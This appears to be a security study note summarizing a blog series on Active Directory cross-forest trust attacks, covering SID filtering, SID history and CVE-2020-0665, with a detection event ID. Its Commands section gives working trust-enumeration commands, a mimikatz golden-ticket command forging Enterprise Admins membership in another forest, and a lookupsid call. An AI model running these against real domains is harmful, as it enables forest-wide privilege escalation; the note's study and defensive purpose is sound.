---
title: AD Forest Trust Attacks (SID Filtering & Transitivity)
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, trusts, lateral-movement, privilege-escalation]
source: raw/ad_forest_trust_attacks.md
---

# AD Forest Trust Attacks (SID Filtering & Transitivity)

> Source: `raw/ad_forest_trust_attacks.md` (dirkjanm.io, two-part series)

## Summary

A domain is not a security boundary in AD — a *forest* is, and SID
filtering is the mechanism that enforces that boundary on cross-forest
trusts. Part 1 covers how SID filtering normally works and how enabling SID
history (`TREAT_AS_EXTERNAL`) weakens it to "any RID > 1000 spoofable."
Part 2 covers **CVE-2020-0665**, a filtering-bypass that let an attacker
who fully controls one forest forge tickets containing a *local* SAM SID
(e.g. RID 500 Administrator) on a member server in a trusting forest. See
[[ad-trust-attacks]] for the concept page.

## Key points

- **TREAT_AS_EXTERNAL**: `netdom trust /enablesidhistory:yes` relaxes
  cross-forest SID filtering to external-trust level — attacker can spoof
  any group SID with RID > 1000 once they control the source forest.
- **CVE-2020-0665** (patched Feb 2020): exploited `msDS-TrustForestTrustInfo`
  / `NetrGetForestTrustInformation` processing on the trusting forest's DC,
  via an `lsass.exe` hook (Frida + `RtlLengthSid`), to get a local SAM SID
  treated as forest-trusted — then forge a ticket as local Administrator
  (RID 500) on a member server in the trusting forest.
- **Detection**: Event ID 4675 (post-patch, filtered SID rejection) — was
  previously DC-only.
- **Takeaway**: compromising one forest is a real threat to a trusting
  forest via abused cross-forest permissions, credential reuse, or
  trust-handling CVEs like this one.

## Commands

```powershell
# Enumerate trusts from a compromised domain
Get-DomainTrust
Get-DomainTrust -Domain trusted-forest.local
nltest /domain_trusts /all_trusts /v

# Check whether SID history / quarantine (filtering) is enabled on a trust
Get-ADTrust -Filter * | Select-Object Name,Direction,ForestTransitive,SIDFilteringQuarantined
```

```powershell
# If SID history is enabled across the trust (TREAT_AS_EXTERNAL),
# forge a cross-forest Golden Ticket with an extra-domain SID (e.g. Enterprise Admins of the other forest)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-<corp-sid> /krbtgt:<krbtgt_aes256key> /sids:S-1-5-21-<other-forest-sid>-519 /ptt
```

```bash
# Enumerate a target forest's resolvable local SAM SID (for CVE-2020-0665 style chains)
lookupsid.py DOMAIN/user:password@member-server.otherforest.local 0
```
